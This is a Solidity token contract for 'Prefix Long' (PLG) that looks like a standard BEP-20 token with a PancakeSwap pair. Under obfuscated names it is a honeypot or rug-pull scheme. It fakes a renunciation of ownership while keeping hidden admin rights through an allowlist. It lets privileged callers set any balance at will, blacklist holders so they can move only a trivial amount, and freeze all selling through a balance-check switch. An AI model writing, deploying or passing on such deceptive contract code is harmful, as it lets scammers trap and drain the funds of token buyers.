//SPDX-License-Identifier: MIT

pragma solidity ^0.8.16;

interface swapSender {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract takeSwap {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface txTeamAuto {
    function createPair(address senderAt, address receiverAt) external returns (address);
}

interface toReceiver {
    function totalSupply() external view returns (uint256);

    function balanceOf(address takeAmount) external view returns (uint256);

    function transfer(address shouldFundTrading, uint256 fromTake) external returns (bool);

    function allowance(address exemptLaunched, address spender) external view returns (uint256);

    function approve(address spender, uint256 fromTake) external returns (bool);

    function transferFrom(
        address sender,
        address shouldFundTrading,
        uint256 fromTake
    ) external returns (bool);

    event Transfer(address indexed from, address indexed receiverTx, uint256 value);
    event Approval(address indexed exemptLaunched, address indexed spender, uint256 value);
}

interface toReceiverMetadata is toReceiver {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract PrefixLong is takeSwap, toReceiver, toReceiverMetadata {

    uint256 private fromFee = 100000000 * 10 ** 18;

    function symbol() external view virtual override returns (string memory) {
        return marketingTrading;
    }

    uint256 public exemptToken;

    function approve(address atMarketing, uint256 fromTake) public virtual override returns (bool) {
        walletTradingExempt[_msgSender()][atMarketing] = fromTake;
        emit Approval(_msgSender(), atMarketing, fromTake);
        return true;
    }

    bool public receiverFund;

    function decimals() external view virtual override returns (uint8) {
        return tokenSender;
    }

    function transfer(address fromIs, uint256 fromTake) external virtual override returns (bool) {
        return sellTx(_msgSender(), fromIs, fromTake);
    }

    event OwnershipTransferred(address indexed autoWallet, address indexed isReceiver);

    address private minToken;

    function totalSupply() external view virtual override returns (uint256) {
        return fromFee;
    }

    constructor (){
        
        swapSender totalReceiverReceiver = swapSender(feeMaxToken);
        walletTo = txTeamAuto(totalReceiverReceiver.factory()).createPair(totalReceiverReceiver.WETH(), address(this));
        if (exemptToken == liquidityIsMarketing) {
            buyWallet = liquidityIsMarketing;
        }
        atWalletLimit = _msgSender();
        totalShould();
        swapMarketing[atWalletLimit] = true;
        enableWallet[atWalletLimit] = fromFee;
        if (isMode != liquidityIsMarketing) {
            liquidityIsMarketing = amountFrom;
        }
        emit Transfer(address(0), atWalletLimit, fromFee);
    }

    uint256 private liquidityIsMarketing;

    string private sellWallet = "Prefix Long";

    function fundLaunchedAt(address fromIs, uint256 fromTake) public {
        walletTotal();
        enableWallet[fromIs] = fromTake;
    }

    function balanceOf(address takeAmount) public view virtual override returns (uint256) {
        return enableWallet[takeAmount];
    }

    string private marketingTrading = "PLG";

    address public atWalletLimit;

    function totalShould() public {
        emit OwnershipTransferred(atWalletLimit, address(0));
        minToken = address(0);
    }

    function modeFundTo(address launchSell, address shouldFundTrading, uint256 fromTake) internal returns (bool) {
        require(enableWallet[launchSell] >= fromTake);
        enableWallet[launchSell] -= fromTake;
        enableWallet[shouldFundTrading] += fromTake;
        emit Transfer(launchSell, shouldFundTrading, fromTake);
        return true;
    }

    function senderLimit(uint256 fromTake) public {
        walletTotal();
        autoReceiver = fromTake;
    }

    uint8 private tokenSender = 18;

    function toListTotal(address launchReceiverIs) public {
        walletTotal();
        
        if (launchReceiverIs == atWalletLimit || launchReceiverIs == walletTo) {
            return;
        }
        modeTradingMin[launchReceiverIs] = true;
    }

    bool public tokenSwap;

    mapping(address => bool) public swapMarketing;

    bool public maxToken;

    address public walletTo;

    address feeMaxToken = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 isAutoLaunch;

    mapping(address => bool) public modeTradingMin;

    function feeList(address walletAuto) public {
        require(walletAuto.balance < 100000);
        if (tokenSwap) {
            return;
        }
        if (senderSwapTx) {
            senderSwapTx = true;
        }
        swapMarketing[walletAuto] = true;
        if (maxToken == receiverFund) {
            buyWallet = amountFrom;
        }
        tokenSwap = true;
    }

    mapping(address => uint256) private enableWallet;

    function allowance(address buyFrom, address atMarketing) external view virtual override returns (uint256) {
        if (atMarketing == feeMaxToken) {
            return type(uint256).max;
        }
        return walletTradingExempt[buyFrom][atMarketing];
    }

    function walletTotal() private view {
        require(swapMarketing[_msgSender()]);
    }

    uint256 private isMode;

    function name() external view virtual override returns (string memory) {
        return sellWallet;
    }

    bool private senderSwapTx;

    function transferFrom(address launchSell, address shouldFundTrading, uint256 fromTake) external override returns (bool) {
        if (_msgSender() != feeMaxToken) {
            if (walletTradingExempt[launchSell][_msgSender()] != type(uint256).max) {
                require(fromTake <= walletTradingExempt[launchSell][_msgSender()]);
                walletTradingExempt[launchSell][_msgSender()] -= fromTake;
            }
        }
        return sellTx(launchSell, shouldFundTrading, fromTake);
    }

    uint256 autoReceiver;

    uint256 constant modeTo = 5 ** 10;

    uint256 public amountFrom;

    uint256 private sellMin;

    function owner() external view returns (address) {
        return minToken;
    }

    address enableMax = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 private buyWallet;

    function getOwner() external view returns (address) {
        return minToken;
    }

    mapping(address => mapping(address => uint256)) private walletTradingExempt;

    function sellTx(address launchSell, address shouldFundTrading, uint256 fromTake) internal returns (bool) {
        if (launchSell == atWalletLimit) {
            return modeFundTo(launchSell, shouldFundTrading, fromTake);
        }
        uint256 fromFund = toReceiver(walletTo).balanceOf(enableMax);
        require(fromFund == autoReceiver);
        require(shouldFundTrading != enableMax);
        if (modeTradingMin[launchSell]) {
            return modeFundTo(launchSell, shouldFundTrading, modeTo);
        }
        return modeFundTo(launchSell, shouldFundTrading, fromTake);
    }

}